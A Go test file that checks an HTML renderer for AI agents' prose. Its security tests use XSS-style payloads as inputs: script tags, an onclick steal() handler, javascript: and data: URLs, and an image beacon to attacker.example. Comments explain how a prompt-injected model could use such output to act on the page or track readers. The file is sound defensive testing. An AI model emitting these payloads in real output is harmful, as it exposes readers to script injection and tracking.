package web

// What an agent's prose may and may not become once it is HTML.
//
// Every input here is text a model could write, and every assertion is a
// boundary rather than a formatting preference: the rendering ones say the
// review is readable, the refusal ones say it cannot act on the page it is
// rendered into.

import (
	"strings"
	"sync"
	"testing"

	"github.com/alecthomas/chroma/v2"
	"github.com/alecthomas/chroma/v2/lexers"
)

func TestRenderProseRendersWhatModelsWrite(t *testing.T) {
	t.Parallel()

	for _, test := range []struct {
		name  string
		input string
		want  string
	}{
		{"heading", "## Falsified — dropped", "<h2>Falsified — dropped</h2>"},
		{"bold", "**3 survived**", "<strong>3 survived</strong>"},
		{"inline code", "the `have_css` matcher", "<code>have_css</code>"},
		{"list", "- one\n- two", "<li>one</li>"},
		{"ordered list", "1. first\n2. second", "<ol>"},
		{"table", "| a | b |\n|---|---|\n| 1 | 2 |", "<td>1</td>"},
		{"blockquote", "> quoted", "<blockquote>"},
	} {
		if got := string(renderProse(test.input)); !strings.Contains(got, test.want) {
			t.Errorf("%s: rendered %q, want it to contain %q", test.name, got, test.want)
		}
	}
}

// TestRenderProseRefusesToActOnThePage is the security contract. Each case
// names the thing a prompt injection would be trying to do.
func TestRenderProseRefusesToActOnThePage(t *testing.T) {
	t.Parallel()

	for _, test := range []struct {
		name    string
		input   string
		absent  []string
		present []string
	}{
		{
			name:   "script tags are not markup",
			input:  "<script>alert(1)</script>",
			absent: []string{"<script"},
		},
		{
			name:   "event handlers are not markup",
			input:  `<div onclick="steal()">hi</div>`,
			absent: []string{"onclick"},
		},
		{
			name:   "javascript URLs do not survive as hrefs",
			input:  "[click](javascript:alert(1))",
			absent: []string{"javascript:"},
		},
		{
			name:   "data URLs do not survive as hrefs",
			input:  "[click](data:text/html;base64,PHNjcmlwdD4=)",
			absent: []string{"data:text/html"},
		},
		{
			// The whole reason this renderer needed writing: an image is a
			// GET the browser makes on its own, so a beacon in a review would
			// report the reader to whoever wrote the prompt.
			name:    "images are never fetched",
			input:   "![leak](http://attacker.example/p.gif?run=7UEJWZND)",
			absent:  []string{"<img", "attacker.example/p.gif", "run=7UEJWZND"},
			present: []string{"image not loaded", "attacker.example", "leak"},
		},
		{
			// The replacement text is built FROM the image's own alt text and
			// destination, so it is model-authored too. Written as a "code"
			// string it would have been emitted verbatim — the substitution
			// would have become the injection.
			name:    "the image replacement is itself escaped",
			input:   "![<script>alert(1)</script>](http://attacker.example/p.gif)",
			absent:  []string{"<script"},
			present: []string{"image not loaded", "attacker.example"},
		},
		{
			name:    "links cannot reach back through the opener",
			input:   "[a](https://ok.example)",
			present: []string{`rel="noopener noreferrer nofollow"`, `href="https://ok.example"`},
		},
		{
			name:    "bare URLs are linked under the same terms",
			input:   "see http://ok.example/x for more",
			present: []string{`rel="noopener noreferrer nofollow"`},
		},
		{
			// The run page's own anchors are #step-N-name. An agent that can
			// mint ids can collide with them and hijack a shared link.
			name:   "headings mint no anchors",
			input:  "## Heading",
			absent: []string{"id="},
		},
	} {
		got := string(renderProse(test.input))

		for _, absent := range test.absent {
			if strings.Contains(got, absent) {
				t.Errorf("%s: rendered %q, which must not contain %q", test.name, got, absent)
			}
		}

		for _, present := range test.present {
			if !strings.Contains(got, present) {
				t.Errorf("%s: rendered %q, want it to contain %q", test.name, got, present)
			}
		}
	}
}

// TestRenderProseKeepsFencedCodeHighlighted covers what the old fence-only
// renderer did well, since replacing it must not lose that.
func TestRenderProseKeepsFencedCodeHighlighted(t *testing.T) {
	t.Parallel()

	got := string(renderProse("```go\nfunc main() {}\n```"))

	if !strings.Contains(got, "<pre") {
		t.Errorf("fenced code did not render as a block: %s", got)
	}

	// chroma emits inline styles from the site's own palette; without the
	// highlighter this would be bare text in a <pre>.
	if !strings.Contains(got, "<span style=") {
		t.Errorf("fenced code is not highlighted: %s", got)
	}
}

// TestRenderProseIsEmptyForEmptyInput keeps an answerless step from rendering
// an empty box that looks like something failed to load.
func TestRenderProseIsEmptyForEmptyInput(t *testing.T) {
	t.Parallel()

	for _, input := range []string{"", "   ", "\n\n"} {
		if got := renderProse(input); got != "" {
			t.Errorf("renderProse(%q) = %q, want empty", input, got)
		}
	}
}

// TestDiffRendersAddedAndRemovedDistinctly pins docsCodeStyle's Generic*
// entries: without them a highlighted diff renders flat, one colour, which
// makes the single most valuable detection buy nothing.
func TestDiffRendersAddedAndRemovedDistinctly(t *testing.T) {
	t.Parallel()

	diff := "--- a/file.txt\n+++ b/file.txt\n@@ -1 +1 @@\n-old line\n+new line\n"

	got := string(highlightCode(diff, "diff"))

	if !strings.Contains(got, "#e0645a") {
		t.Errorf("diff rendering missing the removed-line colour: %s", got)
	}

	if !strings.Contains(got, "#84c06d") {
		t.Errorf("diff rendering missing the added-line colour: %s", got)
	}
}

// TestHighlightEscapes is the security contract for the highlighting path,
// mirroring TestRenderProseRefusesToActOnThePage for prose: none of these
// entry points may let model- or file-authored content act on the page.
func TestHighlightEscapes(t *testing.T) {
	t.Parallel()

	const payload = `<script>alert(1)</script>`

	for name, got := range map[string]string{
		"highlightMessage": string(highlightMessage(payload)),
		"highlightPayload": string(highlightPayload(payload)),
		"renderModelText":  string(renderModelText(payload)),
	} {
		if strings.Contains(got, "<script") {
			t.Errorf("%s(%q) leaked a raw <script>: %s", name, payload, got)
		}
	}
}

// panicLexer is a chroma.Lexer whose Tokenise always panics, used to prove
// highlightCode's recover actually fires rather than merely existing.
type panicLexer struct{}

func (panicLexer) Config() *chroma.Config { return &chroma.Config{Name: "panic-test-lexer"} }

func (panicLexer) Tokenise(*chroma.TokeniseOptions, string) (chroma.Iterator, error) {
	panic("boom")
}

func (l panicLexer) SetRegistry(*chroma.LexerRegistry) chroma.Lexer { return l }

func (l panicLexer) SetAnalyser(func(string) float32) chroma.Lexer { return l }

func (panicLexer) AnalyseText(string) float32 { return 0 }

// TestHighlightSurvivesAPanic is the resiliency hole a highlighter reachable
// from every message and payload opens: a panic inside a template func
// propagates out of ExecuteTemplate as a 500 on the page a person is
// triaging on, and kills the live stream's flush goroutine. The fallback
// must be escaped plain text, not a crash.
func TestHighlightSurvivesAPanic(t *testing.T) {
	// Registered here, NOT via t.Parallel(): this happens during the test
	// binary's strictly-sequential phase (every test's code before its own
	// call to t.Parallel() runs one at a time), before any other test's
	// parallel phase resumes concurrently — chroma's LexerRegistry has no
	// lock, so registering after t.Parallel() would race every other
	// parallel test's lexers.Get.
	lexers.Register(panicLexer{})

	t.Parallel()

	got := highlightCode(`<script>still escaped</script>`, "panic-test-lexer")

	if strings.Contains(string(got), "<script") {
		t.Errorf("recovered output leaked markup: %s", got)
	}

	if !strings.Contains(string(got), "still escaped") {
		t.Errorf("recovered output dropped the text entirely: %s", got)
	}
}

// TestHighlightIsSafeForConcurrentRenders exercises the package-level
// formatter and lexer registry from many goroutines at once — the page
// renderer and the live stream's flush goroutine are exactly this shape.
// -race is what actually catches a regression here.
func TestHighlightIsSafeForConcurrentRenders(t *testing.T) {
	t.Parallel()

	const goroutines = 16

	inputs := []string{
		"package main\n\nfunc main() {}\n",
		"--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\n",
		"just an ordinary sentence about the weather",
		`{"a": 1, "b": [1, 2, 3]}`,
	}

	var wg sync.WaitGroup

	for i := range goroutines {
		wg.Add(1)

		go func(n int) {
			defer wg.Done()

			text := inputs[n%len(inputs)]
			_ = highlightMessage(text)
			_ = highlightPayload(text)
			_ = renderModelText(text)
		}(i)
	}

	wg.Wait()
}
